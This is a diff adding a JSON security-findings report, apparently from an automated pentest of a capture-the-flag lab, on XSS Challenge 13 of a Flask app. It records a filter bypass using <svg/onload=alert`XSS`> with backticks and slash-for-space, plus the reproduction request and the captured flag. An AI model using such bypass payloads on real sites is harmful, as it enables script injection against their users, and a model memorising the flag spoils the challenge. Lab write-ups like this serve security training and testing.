@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:22:54.501723+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "87b8a966-92de-4b76-b722-2e642009a1c1",
+      "timestamp": "2026-04-12T21:22:54.501614+00:00",
+      "title": "XSS Challenge 13 - Filter Bypass via SVG/Backtick",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48713/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter unsanitized into the HTML response. The server-side filter blocks: 'script', 'onerror', single quotes ('), and spaces. Bypassed by using <svg/onload=...> (slash instead of space) with backtick template literals instead of quotes. CTF flag extracted.",
+      "evidence": "GET /page?name=%3Csvg%2Fonload%3Dalert%60XSS%60%3E\n\nResponse: Congratulations! Here is the flag: flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}\n\nWorking payload: <svg/onload=alert`XSS`>\nAlso works: <svg/onload=alert(\"XSS\")>",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:48713/page?name=%3Csvg%2Fonload%3Dalert%60XSS%60%3E",
+        "expected": "flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "5b7909c7-3659-4dae-91f2-94187ee4e2ff",
+      "timestamp": "2026-04-12T21:23:02.737883+00:00",
+      "title": "Dalgona CTF Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Home[\"GET / (Index Page)\"]\n  Home --> Page[\"GET /page?name= (XSS Challenge 13)\"]\n  Page --> Filter[\"Server-side Filter\\nBlocks: script, onerror, quotes, spaces\"]\n  Filter -->|\"Bypass: svg/onload + backticks\"| XSS[\"XSS Execution + Flag\"]\n  Page --> Static[\"Static Assets /static/\"]\n  Stack[\"Flask 3.1.8 / Python 3.11.15 / Werkzeug 3.1.8\"] -.-> Page"
+    }
+  ]
+}
